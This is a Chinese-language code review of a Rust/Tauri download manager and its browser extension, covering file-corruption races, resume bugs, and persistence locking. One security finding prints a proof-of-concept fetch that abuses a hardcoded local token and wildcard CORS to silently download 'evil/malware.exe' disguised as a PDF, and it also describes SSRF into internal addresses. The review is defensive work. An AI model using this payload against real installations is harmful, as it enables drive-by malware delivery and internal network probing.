## 0. 结论摘要（TL;DR）

整体实现质量**明显高于一般个人项目**：多段并发下载、`pwrite`/`seek_write` 无游标随机写、`SlotGuard` RAII 计数、`CancellationToken` 全链路取消、限速用「时刻表」做长期均值、持久化用临时文件原子替换——这些都是下载器里真正难做对的地方，作者做对了。

但存在 **3 个严重（P0）问题**，其中两个会导致**用户文件静默损坏**，一个是**本地安全漏洞**：

| 编号 | 级别 | 问题 | 后果 |
|---|---|---|---|
| P0-1 | 🔴 严重 | 同名/重复链接并发下载共用同一个 `.fluxdl-part` | 文件内容交错损坏，却显示「已完成」 |
| P0-2 | 🔴 严重 | 续传时无条件信任持久化的分段进度 | `.fluxdl-part` 丢失时补零，文件静默损坏 |
| P0-3 | 🔴 严重 | 本地 HTTP 服务用**硬编码固定 token** + `Access-Control-Allow-Origin: *` | 任意网站可「路过式」静默下载任意文件，并可 SSRF 探测内网 |
| P1-4 | 🟠 高 | 删除任务时不清理 `.fluxdl-part` | 磁盘残留大文件 |
| P1-5 | 🟠 高 | `save()` 并发无锁 | `tasks.json` 可能损坏/丢状态 |
| P1-6 | 🟠 高 | `spawn_runner` 检查与写 token 非原子 | 极端情况下暂停失效 / 双跑 |

> 建议：先修 P0-1、P0-2、P0-3，再处理 P1。P0 的修复都不大（各 10~30 行），但都值得配回归测试。

## 1. 实现亮点（值得保留的设计）

- **并发写盘正确**：`util::write_at` 在 Windows 用 `seek_write`、Unix 用 `write_at`，基于偏移的定位写，多分段共享同一个 `Arc<File>` 也不会互相踩游标。
- **取消传播干净**：`CancellationToken` 贯穿 probe、分段循环、顺序流、媒体子进程，暂停能真正打断 `sleep`/`read`/`select`。
- **并发度受控**：`acquire_slot` + `SlotGuard`（`Drop` 里递减并 `notify_waiters`）实现 `max_active` 排队，RAII 保证不泄漏计数。
- **限速算法正确**：`RateLimiter` 用「下一次可用时刻」累加 `bytes/rate`，长期均值精确，且 `set_limit` 会重置时刻表。
- **原子持久化**：临时文件 `xxx.json.tmp` → 覆盖 → rename，避免半截 JSON；启动时把 in-flight 任务统一降级为 Paused，不会开机狂跑带宽。
- **文件名推断完善**：`Content-Disposition`（含 `filename*=UTF-8''`）、URL query（含 S3 的 `response-content-disposition`）、泛化名（`download`/`index`）识别都做了，并有单测。

## 2. 问题清单

### 🔴 P0-1 同名 / 重复链接并发下载共用同一个 `.fluxdl-part`（文件损坏）

**位置**：`crates/download-engine/src/util.rs::unique_path` + `manager.rs::add` + `http.rs::run`

**现象**：`unique_path` 只用 `candidate.exists()` 判断重名：

```rust
// util.rs
pub fn unique_path(dir: &Path, filename: &str) -> PathBuf {
    let mut candidate = dir.join(filename);
    if !candidate.exists() { return candidate; }   // 只看最终文件是否存在
    ...
}
```

但实际写盘用的是 **`save_path + ".fluxdl-part"`**（`http.rs::run`）：

```rust
let part_path = PathBuf::from(format!("{}.fluxdl-part", save_path.to_string_lossy()));
```

`add()` 在 `unique_path` 之后**并没有把目标名占住**，而真正的 part 文件是稍后在 `http::run`（另一个 `tokio::spawn`）里才创建的。于是：

1. 批量导入重复链接，或两次快速添加同一链接：`add1` 拿到 `file.zip` 时磁盘上还没有任何文件，`add2` 再调 `unique_path` 仍看到 `file.zip` 不存在 → **两者都拿到 `file.zip`**。
2. 两个 runner 各自打开**同一个** `file.zip.fluxdl-part`，各自 `set_len(total)`，各自按分段偏移写 → 数据交错。
3. 两者都 `finish_file` → rename 同一对路径，互相覆盖。

**影响**：文件内容损坏，但任务状态都是 `Completed`。用户几乎不可能发现。

**修复建议**（三选一或组合）：
- **推荐**：`Engine` 维护一个「已占用目标路径」集合（在 `tasks` 写锁内插入），`add()` 时在持锁状态下分配并占位；`unique_path` 同时判断 `name` 和 `name + ".fluxdl-part"` 是否存在。
- 或在 `add()` 里**同步创建**空 part 文件（`File::create(part_path)`）占位，让后续 `exists()` 生效。
- 或对同 URL 做去重（同 URL 且未完成则直接复用/拒绝）。

```rust
// 示意：unique_path 增加 part 判断
fn taken(dir: &Path, name: &str) -> bool {
    let p = dir.join(name);
    p.exists() || dir.join(format!("{name}.fluxdl-part")).exists()
}
```

> 现有测试 `downloads_with_range_connections` 用的是随机 payload + 单任务，恰好绕开了这条路径。

### 🔴 P0-2 续传时无条件信任分段进度（`.fluxdl-part` 丢失 → 补零损坏）

**位置**：`crates/download-engine/src/http.rs::run`

**现象**：`effective_resume` 的判断只看**持久化的元数据**，不看磁盘上 part 文件是否真的存在、长度是否对：

```rust
let effective_resume = resumable
    && stored_total == total
    && prev_bytes > 0
    && !prev_segments.is_empty();   // 全部来自 tasks.json
```

随后打开 part 文件：

```rust
let file = std::fs::OpenOptions::new()
    .create(true).read(true).write(true)
    .open(&part_path)?;             // 若文件不存在 → 新建空文件
if total > 0 {
    let len = f.metadata()?.len();
    if len != total { f.set_len(total)?; }   // 空文件被拉成 total 大的稀疏文件（全 0）
}
```

此时 `segments` 里那些 `downloaded > 0 / done = true` 的分段**被认为已完成而跳过下载**，但它们对应的字节在稀疏文件里其实是 0。

**触发场景**：用户清理下载目录删了 `.fluxdl-part`、磁盘清理工具、上次异常退出导致 part 丢失、或 part 被安全软件隔离——只要 `tasks.json` 里还留着进度，续传就会产出「长度正确但内容一半是 0」的文件。

**影响**：静默数据损坏，`Completed` 状态。

**修复建议**：信任磁盘而非元数据。

```rust
let part_len = std::fs::metadata(&part_path).map(|m| m.len()).unwrap_or(0);
let can_resume = effective_resume && part_len == total;
// 若不满足 → 重置：segments 全部 downloaded=0/done=false, entry.downloaded=0
```

更稳妥的做法是给 part 文件配一个 sidecar（如 `xxx.fluxdl-state`）记录分段状态 + 远端 ETag/Last-Modified，续传前校验长度与 ETag 一致才续。

### 🔴 P0-3 本地 HTTP 服务：硬编码 token + 全开 CORS（路过式下载 / SSRF）

**位置**：`src-tauri/src/lib.rs`（`CAPTURE_TOKEN`、`write_http_response`、`handle_capture_conn`）+ `browser-extension/background.js`

**现象**：

```rust
// lib.rs
const CAPTURE_TOKEN: &str = "fluxdl-local-v1";   // 固定常量
```

```rust
// write_http_response
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: content-type, x-fluxdl-token
Access-Control-Allow-Methods: GET, POST, OPTIONS
```

扩展端同样把 token 写死（`background.js`：`const TOKEN = "fluxdl-local-v1"`）。

**为什么危险**：
- 服务监听 `127.0.0.1:35917` 本身是对的，但 `Access-Control-Allow-Origin: *` 让**任意网页**都能跨域调用；而 token 是公开常量，攻击者不需要读本地文件就知道。
- 于是任意恶意网页可以：
  ```js
  fetch('http://127.0.0.1:35917/api/downloads', {
    method:'POST',
    headers:{'content-type':'application/json','x-fluxdl-token':'fluxdl-local-v1'},
    body: JSON.stringify({url:'https://evil/malware.exe', filename:'invoice.pdf.exe'})
  })
  ```
  → **静默把任意文件下载到用户「下载」目录**（路过式下载），还能指定文件名诱导点击。
- `add()` 只校验 `http/https`，**不限制目标地址**，因此还能被当作 SSRF 跳板去拉取 `http://127.0.0.1:其他端口` / 内网 `192.168.x.x` 的内容落盘。
- `/api/health` 也是无鉴权 + `*`，可被网页用于**指纹识别**「装了 FluxDL」。

**修复建议**：
1. **去掉固定 token**：首次运行时生成随机 token（`getrandom`/`uuid`）存入 app data（如 `capture.json`），扩展通过一次性「配对」流程获取（设置页展示/输入，或扫码）。随机 token 能同时挡住网页和 DNS rebinding。
2. **收紧 CORS**：不要把 `*` 写死；仅当 `Origin` 以 `chrome-extension://` 开头时回显该 Origin，否则不回 ACAO。注意 DNS rebinding 仍需靠随机 token 兜底。
3. **限制目标地址**：拒绝 `127.0.0.0/8`、`169.254.0.0/16`、`10./172.16-31./192.168.` 等内网/回环目标（至少对来自 HTTP 接口的任务）。
4. `/api/health` 至少不返回 `Access-Control-Allow-Origin: *`。

> 这条是「本地下载器 + 浏览器扩展」架构里最常见、也最容易被忽视的洞，务必优先处理。

### 🟠 P1-4 `remove(delete_file=true)` 不清理 `.fluxdl-part`（磁盘泄漏）

**位置**：`manager.rs::remove`

```rust
if delete_file {
    let path = entry.view.lock().await.save_path.clone();
    tokio::spawn(async move {
        let p = PathBuf::from(path);
        if p.exists() { let _ = tokio::fs::remove_file(p).await; }
    });
}
```

只删最终文件。**进行中/已暂停**的任务，真实数据在 `save_path + ".fluxdl-part"`，最终文件根本不存在 → 删了个寂寞，大文件永久残留。

**修复**：同时删除 `format!("{}.fluxdl-part", path)`；失败的重试/失败任务同理。

### 🟠 P1-5 `save()` 并发无锁（`tasks.json` 可能损坏 / 丢状态）

**位置**：`manager.rs::save` + `store.rs::save`

`save()` 会被 `add` / `pause` / `set_speed_limit` / `set_options` / `tick`（活动时每 5s）**并发调用**，但没有任何互斥。`store::save` 的写法是：

```rust
let tmp = path.with_extension("json.tmp");
tokio::fs::write(&tmp, raw).await?;      // 两个 save 同时写同一个 tmp
if path.exists() { tokio::fs::remove_file(path).await.ok(); }
tokio::fs::rename(&tmp, path).await
```

两个并发 `save()` 同时 `write` 同一个 `.tmp` 文件，再各自 `remove + rename`，存在交错写入 / rename 竞争，极端情况下写出半截或相互覆盖的 JSON。另外 Windows 上「先 remove 再 rename」不是原子操作，崩溃窗口会丢 `tasks.json`。

**修复**：
- 给 `Engine` 加一个 `save_lock: tokio::sync::Mutex<()>`（或 `AtomicBool` + 去抖），串行化保存；
- 保存做成**去抖**（如 500ms 合并），减少 5s tick 的高频全量写；
- 若条件允许，用「写 tmp → `fs::rename`（Windows 用 `ReplaceFile`/`MoveFileEx`）」保证原子替换。

### 🟠 P1-6 `spawn_runner` 检查 / 写 token 非原子（暂停可能失效）

**位置**：`manager.rs::spawn_runner`

```rust
let already_running = entry.cancel.lock().await
    .as_ref().map(|t| !t.is_cancelled()).unwrap_or(false);
if already_running { return; }
...
*entry.cancel.lock().await = Some(token.clone());   // 两次独立加锁
```

检查与写入分属两个临界区。若两个入口（如 `resume_all` 与用户 `resume`、或 `retry` 与 `resume`）几乎同时进入，可能都通过检查、都创建 token，后者覆盖前者。此时若 `runner1` 正在跑，`pause()` 取消的是被覆盖后的新 token，**runner1 收不到取消 → 暂停无效**。`run_task` 开头的 `status != Queued` 检查挡住了大部分双跑，但暂停失效这一条仍成立。

**修复**：把「检查 + 置位」合并进同一个 `entry.cancel.lock().await` 作用域，用一个布尔返回值表示是否抢到启动权。

### 🟡 P2（健壮性 / 安全加固 / 体验）

| 编号 | 位置 | 问题 | 建议 |
|---|---|---|---|
| P2-1 | `http.rs::probe` | 探测连接超时 25s 但**不重试**，一次网络抖动整个任务直接失败（与分段 4 次重试不一致） | probe 加 2~3 次退避重试 |
| P2-2 | `media.rs` | yt-dlp 子进程**完全绕过限速**（全局/单任务） | 至少在设置里说明，或用 `--limit-rate` 传给 yt-dlp |
| P2-3 | `lib.rs::install_tools` | 从固定 URL 下载 `yt-dlp.exe`、ffmpeg zip，**不校验哈希/签名** | 内置已知 SHA256 校验，或改用官方提供校验值 |
| P2-4 | `lib.rs::looks_like_media` | 用 `lowered.contains(host)` 子串匹配，`https://x.com/...` 会命中任何包含该子串的路径 | 解析 URL 的 host 后做精确/后缀匹配 |
| P2-5 | `media.rs::find_output` | 用 `name.contains(stem)` 猜输出文件，`stem=="video"` 时几乎匹配一切 | 优先用 `after_move` 打印的真实路径；兜底时限定扩展名/时间窗 |
| P2-6 | `tauri.conf.json` | `"csp": null` 关闭 CSP | 本地页面也给一个最小 CSP（`default-src 'self'`） |
| P2-7 | `lib.rs::start_capture_server` | 端口被占用时**静默 `return`**，用户完全不知道扩展失效 | bind 失败时发事件/托盘提示 |
| P2-8 | `manager.rs::tick` | 每 500ms 给**每个**任务（含已完成/暂停）发一次 `Task` 事件 | 只对活动任务发，或降频 |

### 🟢 P3（规范 / 文档 / 清理）

- `src/store.ts` 默认 `saveDir: "C:\\Users\\Alex\\Downloads"`：写死了某个用户名。虽然启动后会被 `getEngineOptions()` 覆盖，但作为 fallback 是错的（引擎侧已经用 `dirs::download_dir()`，前端应对齐）。
- `README.md` 只有一行 `# Test`，缺构建/用法/架构说明。
- 分支 `trae/agent-XPgl0v` 疑似其它 AI 工具遗留，可清理。
- `media.rs` 用 `|` 作分隔符解析 `%(filepath)s`：文件名含 `|` 时会解析错位（`splitn(6,'|')` 的第 6 段会被截断）。
- `util::unique_path` 最多尝试 1000 次后返回可能重名的路径（极端情况下）。

## 3. 测试覆盖评估

现状（`crates/download-engine/tests/http_engine.rs`）：**4 个集成测试覆盖了主路径**，质量不错：

- ✅ Range 多连接下载 + 内容正确性 + `.fluxdl-part` 清理
- ✅ 无 Range 服务器 → 顺序下载
- ✅ 服务器 `Content-Disposition` 文件名优先于浏览器建议名
- ✅ 暂停→改限速→续传，字节不丢
- ✅ 持久化后重建 Engine，恢复 Paused 任务与分段

**缺口（正好是本次发现问题的区域）**：

- ❌ 同名 / 重复链接并发（P0-1）
- ❌ 续传时 part 文件缺失/被截断（P0-2）
- ❌ `remove(delete_file=true)` 后 part 是否清理（P1-4）
- ❌ 并发 `save()`（P1-5）
- ❌ HTTP 捕获接口的鉴权 / Origin / SSRF（P0-3）
- ❌ 失败重试、5xx、连接中途断开后的续传
- ❌ 媒体（yt-dlp）路径（需 mock 或本地假二进制）

**建议补充的测试**：至少 P0-1、P0-2 各加一个集成测试（用现有的 `TestServer` 稍微改造即可复现），P0-3 加一个「无 token / 错误 Origin 应 401」的单元测试。

## 4. 建议的修复顺序

1. **P0-2**（续传信任磁盘）—— 改动最小、收益最大，防止静默损坏。
2. **P0-1**（路径占位）—— 与 P0-2 同属数据安全，一起修并加测试。
3. **P0-3**（随机 token + 收紧 CORS + 内网拦截）—— 安全，工作量中等。
4. **P1-4 / P1-5 / P1-6** —— 稳定性收尾。
5. **P2** 逐条。

> P0-1、P0-2 都属于「用户看不见、但会毁文件」的 bug，优先级应高于任何新功能。
